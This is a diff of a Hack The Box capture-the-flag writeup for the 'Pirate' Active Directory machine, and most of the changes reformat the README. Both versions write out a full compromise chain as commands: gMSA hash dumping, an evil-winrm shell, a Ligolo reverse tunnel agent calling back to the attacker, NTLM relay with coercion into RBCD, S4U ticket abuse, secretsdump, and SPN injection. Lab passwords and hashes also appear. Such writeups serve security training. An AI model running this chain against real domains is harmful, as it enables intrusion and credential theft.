@@ -1,103 +1,72 @@
-<!-- =========================================================
- 🏴‍☠️ Pirate — HackTheBox Writeup (Active Directory)
- Author: Mrs. Nobody
- Target: <Target_Machine_IP>
-========================================================= -->
+<div align="center">
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=26&duration=2500&pause=800&color=00FF9C&center=true&vCenter=true&width=900&lines=Pirate+%E2%80%94+HackTheBox+Writeup;Active+Directory+%7C+Kerberos+%7C+Delegation+Abuse;Full+Domain+Compromise" />
-</p>
+# Pirate — HackTheBox
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0a0f1a,100:00ff9c&height=120&section=header&text=Pirate%20HTB&fontSize=44&fontColor=00ff9c&animation=twinkling&fontAlignY=35" />
-</p>
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
 
-<p align="center">
-  <img src="assets/MrsNobody.png" width="260" alt="Mrs. Nobody" />
-</p>
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
 
-<p align="center">
-  <strong>Author:</strong> Mrs. Nobody  
-</p>
+**MrsNobody**
 
-<p align="center">
-  <img src="https://img.shields.io/badge/HackTheBox-PWNED-00ff9c?style=for-the-badge&logo=hackthebox&logoColor=black" />
-  <img src="https://img.shields.io/badge/Category-Active%20Directory-0a0f1a?style=for-the-badge&logo=windows&logoColor=00ff9c" />
-  <img src="https://img.shields.io/badge/Focus-Kerberos%20%2F%20Delegation-0a0f1a?style=for-the-badge&logo=keybase&logoColor=00ff9c" />
-  <img src="https://img.shields.io/badge/Tools-Impacket%20%7C%20Evil--WinRM%20%7C%20Ligolo-0a0f1a?style=for-the-badge&logo=gnubash&logoColor=00ff9c" />
-</p>
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-# 🎯 Target
+</div>
 
-- **Domain:** PIRATE.HTB  
-- **Target IP:** `<Target_Machine_IP>`
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
 
----
+## Target Information
 
-# 🚩 Flags
+| Property | Value |
+|----------|-------|
+| Machine | Pirate |
+| IP | `<Target_Machine_IP>` |
+| OS | Windows |
+| Difficulty | Medium |
+| Hostname | DC01.pirate.htb |
+| Domain | PIRATE.HTB |
 
-## 👤 User Flag
+## Table of Contents
 
-**Location**
-```
-C:\Users\a.white\Desktop\user.txt
-```
-
-**Command**
-```cmd
-type C:\Users\a.white\Desktop\user.txt
-```
-
-**Flag**
-```
-<REDACTED_USER_FLAG>
-```
-
----
-
-## 👑 Root Flag
-
-**Location**
-```
-C:\Users\Administrator\Desktop\root.txt
-```
-
-**Command**
-```cmd
-type C:\Users\Administrator\Desktop\root.txt
-```
-
-**Flag**
-```
-<REDACTED_ROOT_FLAG>
-```
+1. [Attack Chain Overview](#attack-chain-overview)
+2. [Initial Setup](#initial-setup)
+3. [Pre-Windows 2000 Compatible Access Abuse](#pre-windows-2000-compatible-access-abuse)
+4. [Dump gMSA Passwords](#dump-gmsa-passwords)
+5. [Shell on DC01](#shell-on-dc01)
+6. [Pivot to Internal Network (Ligolo)](#pivot-to-internal-network-ligolo)
+7. [NTLM Relay to RBCD](#ntlm-relay-to-rbcd)
+8. [Administrator on WEB01](#administrator-on-web01)
+9. [Dump Credentials](#dump-credentials)
+10. [Reset Delegated Admin Password](#reset-delegated-admin-password)
+11. [SPN Injection (WriteSPN Abuse)](#spn-injection-writespn-abuse)
+12. [S4U Delegation to DC01 Administrator](#s4u-delegation-to-dc01-administrator)
+13. [Flags](#flags)
 
 ---
 
-# 🧭 Attack Chain Overview
+## Attack Chain Overview
 
 ```
 MS01$ (Pre-Win2000)
-  → gMSA dump
-    → DC shell
-      → Ligolo pivot
-        → NTLM relay → RBCD
-          → Administrator on WEB01
-            → secretsdump
-              → Reset a.white_adm
-                → SPN injection
-                  → S4U abuse
-                    → Administrator on DC01
-                      → root.txt
+  -> gMSA dump
+    -> DC shell
+      -> Ligolo pivot
+        -> NTLM relay -> RBCD
+          -> Administrator on WEB01
+            -> secretsdump
+              -> Reset a.white_adm
+                -> SPN injection
+                  -> S4U abuse
+                    -> Administrator on DC01
+                      -> root.txt
 ```
 
 ---
 
-# 1️⃣ Initial Setup
-
-## 🖥 ATTACK TERMINAL (Kali)
+## Initial Setup
 
 ### Add Hosts
 
@@ -109,8 +78,6 @@ sudo nano /etc/hosts
 <Target_Machine_IP>  DC01.pirate.htb pirate.htb MS01.pirate.htb
 192.168.100.2        WEB01.pirate.htb
 ```
-
----
 
 ### Configure Kerberos
 
@@ -137,7 +104,7 @@ sudo nano /etc/krb5.conf
 
 ---
 
-# 2️⃣ Pre-Windows 2000 Compatible Access Abuse
+## Pre-Windows 2000 Compatible Access Abuse
 
 MS01$ was a member of:
 
@@ -153,7 +120,7 @@ klist
 
 ---
 
-# 3️⃣ Dump gMSA Passwords
+## Dump gMSA Passwords
 
 ```bash
 python3 gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
@@ -167,7 +134,7 @@ gMSA_ADFS_prod$:::8126756fb2e69697bfcb04816e685839
 
 ---
 
-# 4️⃣ Shell on DC01
+## Shell on DC01
 
 ```bash
 evil-winrm -i DC01.pirate.htb \
@@ -177,21 +144,21 @@ evil-winrm -i DC01.pirate.htb \
 
 ---
 
-# 5️⃣ Pivot to Internal Network (Ligolo)
+## Pivot to Internal Network (Ligolo)
 
-### 🖥 ATTACK TERMINAL — Start Proxy
+### Attack Terminal - Start Proxy
 
 ```bash
 ./proxy -selfcert -laddr 0.0.0.0:443
 ```
 
-### 🪟 DC SHELL — Run Agent
+### DC Shell - Run Agent
 
 ```powershell
 .\agent.exe -connect <YOUR_TUN_IP>:443 -ignore-cert
 ```
 
-### 🖥 ATTACK TERMINAL — Configure Tunnel
+### Attack Terminal - Configure Tunnel
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
@@ -202,7 +169,7 @@ sudo ip addr add 192.168.100.50/24 dev ligolo
 
 ---
 
-# 6️⃣ NTLM Relay → RBCD
+## NTLM Relay to RBCD
 
 ```bash
 ntlmrelayx.py -t ldaps://<Target_Machine_IP> --delegate-access --remove-mic -smb2support
@@ -215,7 +182,7 @@ coercer coerce -l <YOUR_TUN_IP> -t 192.168.100.2 -d pirate.htb \
 
 ---
 
-# 7️⃣ Administrator on WEB01
+## Administrator on WEB01
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/getST.py \
@@ -236,7 +203,7 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py \
 
 ---
 
-# 8️⃣ Dump Credentials
+## Dump Credentials
 
 ```bash
 secretsdump.py -k -no-pass WEB01.pirate.htb -outputfile web01_dump
@@ -250,7 +217,7 @@ PIRATE\a.white : E2nvAOKSz5Xz2MJu
 
 ---
 
-# 9️⃣ Reset Delegated Admin Password
+## Reset Delegated Admin Password
 
 ```bash
 bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
@@ -260,12 +227,12 @@ bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
 
 ---
 
-# 🔟 SPN Injection (WriteSPN Abuse)
+## SPN Injection (WriteSPN Abuse)
 
-⚠ MUST move BOTH:
+Both SPNs must be moved:
 
-- HTTP/WEB01.pirate.htb  
-- HTTP/WEB01  
+- HTTP/WEB01.pirate.htb
+- HTTP/WEB01
 
 ```bash
 python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
@@ -283,7 +250,7 @@ python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
 
 ---
 
-# 1️⃣1️⃣ S4U Delegation → DC01 Administrator
+## S4U Delegation to DC01 Administrator
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/getST.py \
@@ -306,10 +273,49 @@ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
 
 ---
 
-# 🏁 Completed
+## Flags
 
-✔ User flag captured  
-✔ Root flag captured  
-✔ Full Domain Compromise achieved  
+### User Flag
+
+**Location:**
+
+```
+C:\Users\a.white\Desktop\user.txt
+```
+
+**Command:**
+
+```cmd
+type C:\Users\a.white\Desktop\user.txt
+```
+
+### Root Flag
+
+**Location:**
+
+```
+C:\Users\Administrator\Desktop\root.txt
+```
+
+**Command:**
+
+```cmd
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+| Flag | Value |
+|------|-------|
+| User | `<REDACTED>` |
+| Root | `<REDACTED>` |
 
 ---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Pirate*
+
+</div>
